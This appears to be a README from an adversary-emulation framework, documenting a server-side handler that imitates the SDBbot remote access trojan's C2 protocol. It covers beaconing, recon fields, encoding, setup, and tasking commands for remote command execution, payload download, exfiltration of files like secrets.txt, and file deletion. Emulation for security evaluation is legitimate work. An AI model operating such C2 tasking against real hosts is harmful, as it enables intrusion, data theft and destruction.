# SDBbot TCP Handler

The SDBbot TCP Handler functions as the server-side counterpart to the SDBbot implant, and communicates with it over TCP. The handler is configured to do the following:

- respond to implant beacons or task requests with the implant' session ID or tasks
- register a new implant with the control server, or indicate that a session already exists for the implant
- process the task response data and upload to the control server
- accept tasking from `evalsC2client.py` and send to implants when requested

## Components

The handler consists of a TCP listener that listens on a specified address/port.

The first packet sent by the implant will contain an acknowledgement DWORD that will be used as the implant's session ID. The C2 server will respond to the implant's packet with the DWORD, and the implant will then send a recon packet containing the following discovery information:

- `ver`: Malware version number
- `domain`: Target domain name
- `pc`: Target hostname
- `username`: Target user name
- `cc`: target host country code
- `os`: Target Windows version
- `rights`: User rights
- `proxyenabled`: Whether or not proxy is configured

After the implant has been registered with the C2 server, it will automatically set a task to receive the recon packet from the implant. All implant packets must contain the DWORD header. All data will be in JSON format, with the following possible fields:

- `header`: Acknowledgement DWORD and UUID
- `command`: Tasking command number
- `response`: Task output
- `fileName`: File name for file exfiltration
- `fileContents`: Contents of the exfiltrated file

## Encryption

All communication to/from the SDBbot implant will be Base64 encoded and XOR'd. The entire JSON packet will be encoded.

## Usage

### Building

To build the control server binary, run the following command from the `evalsC2server` directory:

```
go build -o controlServer main.go
```

### Configuration

To enable and configure the SDBbot TCP handler within the control server, provide a `sdbbot` entry in your handler configuration YAML file (see example below). Adjust the host and port values as necessary.

Example:

```
sdbbot:
  host: 10.0.2.11
  port: 8080
  enabled: true
```

Run the `controlServer` binary as `sudo` and monitor the output to see SDBbot handler updates. Ex:

```
sudo ./controlServer -c ./config/your_handler_config.yml
```

### Testing

Unit tests for the SDBbot TCP handler are available in the `sdbbot_test.go` file. To run these tests, run the following command from the `evalsC2server` directory:

```
sudo go test ./...
```

To run only a single test, navigate to the `evalsC2server\handlers\sdbbot` directory and run:

```
sudo go test -run NameOfTestFunction
```

### Tasking

To submit a task to the C2 server, pass the task information to the REST API server in a JSON dictionary string containing the following fields:

| Field | Data Type | Necessity | Description |
| ------------ | ----------- | ----------- |----------- |
| id | string | required | The command ID of the task the implant will execute. A table detailing the different tasks is available below. |
| payload | string | optional | The name of the server-side payload to deliver as part of the task. |
| arg | string | optional | Command line arguments for the implant to execute OR paths for file upload/download. |

The following table contains the various acceptable commands and their meanings:

| Command      | Command Number      | Arguments | Implant Output | Description |
| -----------  | ------------------  | --------- | -------------- | ------------|
| "recon" | 42 | None | Recon packet | Recon (automatic task, do not set) |
| "execute" | 2 | CLI arguments | Process output of CLI args | Command execution |
| "download" | 15 | Payload/file name and path | None | File ingress (C2 -> Implant) |
| "read" | 24 | File path | File contents | File exfiltration (Implant -> C2) |
| "delete" | 26 | File path | None | Delete file |

Use the following format to submit the commands from the `evalsC2server` directory:

```
./evalsC2client.py --set-task <UUID> '{"id":"<id>", "payload":"<payload name>", "arg":"<CLI args or file path>"}'
```

Example commands:

- "execute": Task command execution of `whoami`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id":"execute", "arg":"whoami"}'
  ```

- "download": Task file download of `myPayload`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id":"download", "payload": "myPayload", "arg":"/path/to/write/myPayload"}'
  ```

- "read": Task file upload (read file contents) of `secrets.txt`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id":"read", "arg":"/path/to/secrets.txt"}'
  ```

- "delete": Task delete file of `secrets.txt`

  ```
  ./evalsC2client.py --set-task <UUID> '{"id":"delete", "arg":"/path/to/secrets.txt"}'
  ```

### Troubleshooting

## CTI References

1. <https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader>
2. <https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/>
